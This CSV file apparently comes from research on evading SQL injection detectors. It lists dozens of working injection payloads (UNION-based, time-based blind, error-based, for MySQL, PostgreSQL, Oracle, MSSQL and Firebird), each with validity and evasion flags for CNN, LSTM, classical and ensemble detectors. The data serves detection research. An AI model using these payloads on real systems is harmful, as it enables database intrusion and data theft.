,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
7414,1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'hbwk' like 'hbwk,1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'hbwk' like 'hbwk,1,1,0,0,0,0,0
7415,"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu","1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",1,1,0,0,0,0,0
7416,"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--","-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1,1,0,0,0,0,0
7417,"1""  )   union all select null,null,null,null,null,null,null#","1""  )   union all select null,null,null,null,null,null,null#",1,1,0,0,0,0,0
7418,"elt  (  8192  =  8192,sleep  (  5   )    )   ","elt  (  8192  =  8192,sleep  (  5   )    )   ",0,1,0,0,0,0,0
7419,end and    (    (   'zeyr'  =  'zeyr,end and    (    (   'zeyr'  =  'zeyr,1,1,0,0,0,0,0
7420,"1""   )    )    as luon where 4676  =  4676 rlike sleep  (  5  )  #","1""   )    )    as luon where 4676  =  4676 rlike sleep  (  5  )  #",1,1,0,0,0,0,0
7421,"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --","1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1,0,0,0,0,0
7422,"1"" where 3740  =  3740 rlike sleep  (  5  )  #","1"" where 3740  =  3740 rlike sleep  (  5  )  #",1,1,0,0,0,0,0
7423,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt","1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",1,1,0,0,0,0,0
7424,1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,1,0,0,0,0,0
7425,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#","-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",1,1,0,0,0,0,0
7426,-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,0,0,0,0,0
7427,"1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --","1  )   as lfra where 2669  =  2669 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,1,0,0,0,0,0
7428,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,1,1,0,0,0,0,0
7429,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--","1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
7430,"1'+  (  select 'uzaw' where 9900  =  9900 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'","1'+  (  select 'uzaw' where 9900  =  9900 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1,1,0,0,0,0,0
7431,"1""  )   as dlfq where 8410  =  8410","1""  )   as dlfq where 8410  =  8410",1,1,0,0,0,0,0
7432,"1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#","1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#",1,1,0,0,0,0,0
7433,"1  )   and make_set  (  1559  =  4863,4863  )  ","1  )   and make_set  (  1559  =  4863,4863  )  ",0,1,0,0,0,0,0
7434,-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,1,1,0,0,0,0,0
7435,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ","1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1,0,0,0,0,0
7436,"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #","1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,0,0,0,0,0
7437,"1""   )    )     )   union all select null,null,null,null,null,null,null#","1""   )    )     )   union all select null,null,null,null,null,null,null#",1,1,0,0,0,0,0
7438,1'  )   as ihsc where 3978  =  3978,1'  )   as ihsc where 3978  =  3978,1,1,0,0,0,0,0
7439,"-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#","-6125'||  (  select 'hwnm' where 1428  =  1428 union all select 1428,1428,1428,1428,1428,1428#",1,1,0,0,0,0,0
7440,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,0,0,0,0,0
7441,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,1,0,0,0,0,0
7442,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf","1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf",1,1,0,0,0,0,0
7443,"1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --","1'  )   where 7391  =  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,0,0,0,0,0
7444,1'+  (  select dklj where 3265  =  3265,1'+  (  select dklj where 3265  =  3265,1,1,0,0,0,0,0
7445,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ","1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,0,0,0,0,0
7446,"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cbwx'  =  'cbwx","1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cbwx'  =  'cbwx",1,1,0,0,0,0,0
7447,-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1,1,0,0,0,0,0
7448,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,1,1,0,0,0,0,0
7449,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl","1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  -- fwzl",1,1,0,0,0,0,0
7450,-3083  )   or 5221  =  7829,-3083  )   or 5221  =  7829,0,1,0,0,0,0,0
7451,"1'   )    )    union all select null,null,null--","1'   )    )    union all select null,null,null--",1,1,0,0,0,0,0
7452,"1""  )   as vcvw where 2445  =  2445 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --","1""  )   as vcvw where 2445  =  2445 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1,0,0,0,0,0
7453,waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,1,1,0,0,0,0,0
7454,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '","1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",1,1,0,0,0,0,0
7455,"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp","1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",1,1,0,0,0,0,0
7456,"-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--","-3411'   )    )     )   union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1,1,0,0,0,0,0
7457,"-6254"" where 8941  =  8941 or elt  (  1032  =  1032,3623  )  --","-6254"" where 8941  =  8941 or elt  (  1032  =  1032,3623  )  --",1,1,0,0,0,0,0
7458,"1' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0,0,0,0,0
7459,1   )    )     )   order by 1#,1   )    )     )   order by 1#,0,1,0,0,0,0,0
7460,"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  ""","-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,1,1,0,0,0,0,0
7461,select   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  select 4006 from master..sysdatabases  )   end  )  --,select   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  select 4006 from master..sysdatabases  )   end  )  --,1,1,0,0,0,0,0
7462,"1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--","1'+  (  select 'tzey' where 4491  =  4491 union all select null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
7463,"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck","select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",1,1,0,0,0,0,0
7464,1 order by 1#,1 order by 1#,0,1,0,0,0,0,0
7465,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,0,1,0,0,0,0,0
7466,-9340  )   where 5462  =  5462 or 3038  =  3038,-9340  )   where 5462  =  5462 or 3038  =  3038,0,1,0,0,0,0,0
7467,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1,1,0,0,0,0,0
7468,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--","-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",1,1,0,0,0,0,0
7469,1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137,0,1,0,0,0,0,0
7470,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu","select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",1,1,0,0,0,0,0
7471,1  )   where 6472  =  6472,1  )   where 6472  =  6472,0,1,0,0,0,0,0
7472,"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  ""","1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,1,1,0,0,0,0,0
7473,-4595'  )   where 4892  =  4892 order by 1--,-4595'  )   where 4892  =  4892 order by 1--,1,1,0,0,0,0,0
7474,"1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294","1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294",1,1,0,0,0,0,0
7475,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl","1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl",1,1,0,0,0,0,0
7476,1'   )    )    as xirr where 2425  =  2425,1'   )    )    as xirr where 2425  =  2425,1,1,0,0,0,0,0
7477,"1'   )    )    union all select null,null,null,null,null,null,null,null--","1'   )    )    union all select null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
7478,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,0,0,0,0,0
7479,1'   )    )    as cmll where 7948  =  7948 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1'   )    )    as cmll where 7948  =  7948 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,0,0,0,0,0
7480,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb","1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",1,1,0,0,0,0,0
7481,"1'   )    )    as xrre where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --","1'   )    )    as xrre where 1172  =  1172 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,1,0,0,0,0,0
7482,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ","1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",0,1,0,0,0,0,0
7483,"1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'","1'||  (  select 'yhkt' from dual where 7105  =  7105 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   ||'",1,1,0,0,0,0,0
7484,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'pded'  =  'pded","1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'pded'  =  'pded",1,1,0,0,0,0,0
